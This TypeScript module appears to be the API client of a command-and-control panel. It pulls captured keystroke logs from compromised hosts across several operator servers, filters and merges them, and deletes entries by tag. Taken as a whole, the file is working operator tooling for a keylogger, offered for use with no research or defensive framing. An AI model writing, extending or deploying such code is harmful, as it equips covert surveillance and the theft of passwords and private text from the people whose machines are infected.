import type { Session } from "@/api/sessions";
import { getServers, type ServerEntry } from "@/api/system/config";
import { addBearer } from "@/api/system/auth";
import { httpStatusMessage, responseErrorMessage, thrownErrorMessage, unreachableHost } from "@/api/http_status";

export type KeyloggerQuery = {
  search?: string;
  hostTag?: string;
  date?: string;
  timeFrom?: string;
  timeTo?: string;
  page?: number;
  pageSize?: number;
  server?: string;
};

export type KeyloggerItem = {
  tag: string;
  hora: string;
  hostTag: string;
  host: string;
  content: string;
  server?: string;
};

export type KeyloggerListResponse = {
  status: string;
  message?: string;
  content?: KeyloggerItem[];
  hosts?: Session[];
  total?: number;
  page?: number;
  pageSize?: number;
};

export type KeyloggerDeleteResponse = {
  status: string;
  message?: string;
};

const ok = (s?: string) => s === "success" || s === "successfull";

function matchServer(entry: ServerEntry, target?: string) {
  const ip = entry.ip?.trim().replace(/\/$/, "");
  const port = entry.port?.trim();
  if (!ip || !port) return false;
  const base = `${ip}:${port}`;
  if (!target?.trim()) return true;
  return base === target.trim().replace(/\/+$/, "");
}

function parseErrorBody(text: string) {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function buildQuery(query: KeyloggerQuery = {}) {
  const qs = new URLSearchParams();
  if (query.search?.trim()) qs.set("search", query.search.trim());
  if (query.hostTag && query.hostTag !== "all") qs.set("hostTag", query.hostTag);
  if (query.date?.trim()) qs.set("date", query.date.trim());
  if (query.timeFrom?.trim()) qs.set("timeFrom", query.timeFrom.trim());
  if (query.timeTo?.trim()) qs.set("timeTo", query.timeTo.trim());
  if (query.page) qs.set("page", String(query.page));
  if (query.pageSize) qs.set("pageSize", String(query.pageSize));
  const built = qs.toString();
  return built ? `?${built}` : "";
}

function mapKeyloggerItem(item: any, server: string): KeyloggerItem {
  const rest = { ...item };
  delete rest.id;
  delete rest.session_id;
  return {
    ...rest,
    tag: item?.tag ?? "",
    hora: item?.hora ?? "",
    hostTag: item?.hostTag ?? "",
    host: item?.host ?? "",
    content: item?.content ?? "",
    server,
  };
}

export const fetchKeylogger = async (query: KeyloggerQuery = {}): Promise<KeyloggerListResponse> => {
  try {
    const { server, ...params } = query;
    const servers = (await getServers()).filter((s) => matchServer(s, server));
    if (servers.length === 0) {
      return {
        status: "failure",
        message: server ? "Server not found" : "No servers configured",
      };
    }

    const qs = buildQuery(params);
    const responses = (
      await Promise.all(
        servers.map(async (entry) => {
          const ip = entry.ip?.trim().replace(/\/$/, "");
          const port = entry.port?.trim();
          if (!ip || !port) return null;

          try {
            const response = await fetch(`${ip}:${port}/api/keylogger/${qs}`, {
              method: "GET",
              headers: addBearer(entry),
            });
            const text = await response.text();
            if (!response.ok) {
              return {
                status: "failure",
                message: `${entry.name}: ${httpStatusMessage(response.status)}`,
              };
            }
            const data = JSON.parse(text);
            return { ...data, server: `${ip}:${port}` };
          } catch {
            return { status: "ERR_conn", message: `${entry.name}: Unreachable host` };
          }
        }),
      )
    ).filter((r) => r !== null);

    const loaded = responses.filter((r) => ok(r.status));
    if (loaded.length === 0) {
      return responses[0] ?? { status: "failure", message: unreachableHost(servers[0]?.name) };
    }

    const content = loaded.flatMap((res) =>
      (Array.isArray(res?.content) ? res.content : []).map((item: any) =>
        mapKeyloggerItem(item, res.server),
      ),
    );
    const hosts = loaded.flatMap((res) => {
      const origin = res.server ?? "";
      return (Array.isArray(res?.hosts) ? res.hosts : []).map((h: Session) => ({
        ...h,
        _server: origin,
      }));
    });

    return {
      status: "success",
      content,
      hosts,
      total: loaded.reduce((n, r) => n + (Number(r.total) || 0), 0),
      page: Number(loaded[0]?.page) || 1,
      pageSize: Number(loaded[0]?.pageSize) || 50,
    };
  } catch (error) {
    const message = thrownErrorMessage(error);
    return { status: "error", message };
  }
};

export const deleteKeylogger = async (
  tag: string,
  server?: string,
): Promise<KeyloggerDeleteResponse> => {
  const servers = (await getServers()).filter((s) => matchServer(s, server));
  if (servers.length === 0) {
    return {
      status: "failure",
      message: server ? "Server not found" : "No servers configured",
    };
  }

  let lastError: KeyloggerDeleteResponse = {
    status: "failure",
    message: "Request failed",
  };

  for (const entry of servers) {
    const ip = entry.ip?.trim().replace(/\/$/, "");
    const port = entry.port?.trim();
    if (!ip || !port) continue;

    try {
      const response = await fetch(
        `${ip}:${port}/api/keylogger/${encodeURIComponent(tag)}`,
        {
          method: "DELETE",
          headers: addBearer(entry),
        },
      );
      const text = await response.text();
      const json = parseErrorBody(text);
      if (response.ok && json?.status === "success") {
        return json;
      }
      lastError = {
        status: json?.status ?? "failure",
        message: `${entry.name}: ${responseErrorMessage(response.status, json?.message)}`,
      };
    } catch {
      lastError = {
        status: "ERR_conn",
        message: `${entry.name}: Unreachable host`,
      };
    }
  }

  return lastError;
};
